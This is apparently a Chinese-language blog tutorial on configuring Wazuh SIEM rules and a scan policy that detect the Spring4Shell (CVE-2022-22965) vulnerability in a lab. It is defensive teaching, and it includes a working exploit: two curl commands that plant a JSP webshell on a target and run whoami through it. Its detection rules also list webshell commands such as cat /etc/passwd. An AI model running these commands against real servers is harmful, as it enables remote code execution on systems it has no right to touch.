---
title: 【開局地端紅隊小白與雲端資安的清晨Punch】Day28 設定SIEM條件(上)
date: 2024-09-07 28:00:00
tags: [wazuh, 資訊安全]

source: https://ithelp.ithome.com.tw/articles/10348470
series: 雲端資安
categories:
  - 雲端資安
---

# 監測端

需要下載Wazuh儀錶板，並且把Agent部屬在靶機上觀察

[Wazuh 快速入門](https://documentation.wazuh.com/4.4/quickstart.html)
curl -sO https://packages.wazuh.com/4.4/wazuh-install.sh && sudo bash ./wazuh-install.sh -a

登入wazuh頁面
![image](https://hackmd.io/_uploads/SyJsNIXZ0.png)

![image](https://hackmd.io/_uploads/r1onh3dGR.png)

![image](https://hackmd.io/_uploads/rkwah3Of0.png)

![image](https://hackmd.io/_uploads/SJCvahufR.png)

![image](https://hackmd.io/_uploads/BysuTndzC.png)

![image](https://hackmd.io/_uploads/ryKYTn_z0.png)

按照這個網址來更改條件

https://wazuh.com/blog/detecting-spring4shell-cve-2022-22965-with-wazuh/

Wazuh密碼: sudo tar -O -xvf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt

# 測試

查看Spring 的 docker logs
![image](https://hackmd.io/_uploads/rkLxVgIZR.png)

遠端攻擊測試

記得網址一定要改成 **私有IP**

## Wazuh Spring4shell

🎈nano /var/ossec/etc/rules/local_rules.xml
![image](https://hackmd.io/_uploads/S19b-LI-R.png)

```
<group name="spring4shell, attack,">
  <rule id="110001" level="12">
    <if_group>web|accesslog|attack</if_group>
    <regex type="pcre2">%25%7Bc2%7Di%20if\(%22j%22.equals\(request.getParameter\(%22pwd%22\)\)\)%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime\S*.exec\(request.getParameter\(%22cmd%22\)\).getInputStream\(\)%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while\(\(a%3Din.read\(b\)\)\S*3D-1\)%7B%20out.println\(new%20String\(b\)\)%3B%20%7D%20%7D%20%25%7Bsuffix%7Di</regex>
    <description>Possible Spring4Shell RCE (CVE-2022-22965) attack attempt detected.</description>
    <mitre>
      <id>T1190</id>
      <id>T1210</id>
      <id>T1211</id>
    </mitre>
  </rule>
  <rule id="110002" level="12">
    <if_group>web|accesslog|attack</if_group>
    <regex type="pcre2">\.jsp\?pwd=\S*\x26cmd=\S*|\.jsp\?cmd=\S*\x26pwd=\S*|\.jsp\?id=(whoami|cat%20\/etc\/passwd|cat+\/etc\/passwd|ifconfig|ipconfig)</regex>
    <description>JSP webshell HTTP request pattern detected.</description>
    <mitre>
      <id>T1190</id>
      <id>T1210</id>
      <id>T1211</id>
    </mitre>
  </rule>
</group>
```

systemctl restart wazuh-manager

## Agent

sudo a2enmod dump_io

🎈nano /etc/apache2/apache2.conf

```
DumpIOInput On
LogLevel dumpio:trace7
```

![image](https://hackmd.io/_uploads/ryQogh_MR.png)

systemctl restart apache2

🎈nano /var/ossec/etc/ossec.conf 加在 <ossec_config>

```
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/access.log</location>
  <location>/var/log/apache2/error.log</location>
</localfile>
```

### 修改版

改為:var/log/spring/localhost_access_log.2024-04-29.txt

![image](https://hackmd.io/_uploads/r1bMM2OG0.png)

```
<localfile>
    <log_format>apache</log_format>
    <location>/var/log/spring/localhost_access_log.2024-04-29.txt</location> 
</localfile>
```

systemctl restart wazuh-agent

## 攻擊腳本

```
curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://WEB_SERVER/

curl -X GET "http://WEB_SERVER/tomcatwar.jsp?pwd=j&cmd=whoami"
```

## 偵測易受攻擊的Spring framework版本

🎈nano /var/ossec/etc/shared/default/spring4shell_check.yml

```
policy:
  id: "spring4shell_check"
  file: "spring4shell_check.yml"
  name: "Spring4Shell dependency check"
  description: "This document provides prescriptive guidance for identifying Spring4Shell RCE vulnerability"
  references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance
requirements:
  title: "Check if Java is present on the machine"
  description: "Requirements for running the SCA scan against machines with Java on them."
  condition: all
  rules:
    - 'c:sh -c "ps aux | grep java | grep -v grep" -> r:java'
checks:
  - id: 10000
    title: "Ensure Spring framework is not under 5.3.18 or 5.2.20."
    description: "The Spring framework is vulnerable to Spring4Shell RCE (CVE-2022-22965) on versions 5.3.0 to 5.3.17, and 5.2.0 to 5.2.19"
    remediation: "Update the Spring framework to version 5.3.18 or 5.2.20"
    condition: none
    rules:
      - 'c:find / -name "*.jar" -type f -exec sh -c "if unzip -l {} | grep org/springframework/; then unzip -p {} META-INF/MANIFEST.MF; fi | grep Implementation-Version" \; -> r:5.3.0$|5.3.1$|5.3.2$|5.3.3$|5.3.4$|5.3.5$|5.3.6$|5.3.7$|5.3.8$|5.3.9$|5.3.10$|5.3.11$|5.3.12$|5.3.13$|5.3.14$|5.3.15$|5.3.16$|5.3.17$|5.2.0$|5.2.1$|5.2.2$|5.2.3$|5.2.4$|5.2.5$|5.2.6$|5.2.7$|5.2.8$|5.2.9$|5.2.10$|5.2.11$|5.2.12$|5.2.13$|5.2.14$|5.2.15$|5.2.16$|5.2.17$|5.2.18$|5.2.19$'
```

wazuh:wazuh

chown wazuh:wazuh /var/ossec/etc/shared/default/spring4shell_check.yml

🎈/var/ossec/etc/shared/default/agent.conf加入SCA 政策來enable

```
<agent_config os="linux">
  <sca>
    <enabled>yes</enabled>
    <scan_on_start>yes</scan_on_start>
    <interval>24h</interval>
    <skip_nfs>yes</skip_nfs>    
    <policies> 
      <policy>/var/ossec/etc/shared/spring4shell_check.yml</policy>  
    </policies>
  </sca>
</agent_config>
```

echo "sca.remote_commands=1" >> /var/ossec/etc/local_internal_options.conf

systemctl restart wazuh-agent

# Agent部署(在靶機上)

![image](https://hackmd.io/_uploads/B1gSJ8IW0.png)

```
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

![image](https://hackmd.io/_uploads/BkNayIL-C.png)

![image](https://hackmd.io/_uploads/H1k0yIIZC.png)

![image](https://hackmd.io/_uploads/B1zyx88-A.png)

![image](https://hackmd.io/_uploads/rkbeeUI-R.png)

## Wazuh Management / Agent dashboard

![image](https://hackmd.io/_uploads/ry2bqULZA.png)

Wazuh的用法: https://<ip>/

- 帳號密碼: admin+密碼(檔案)
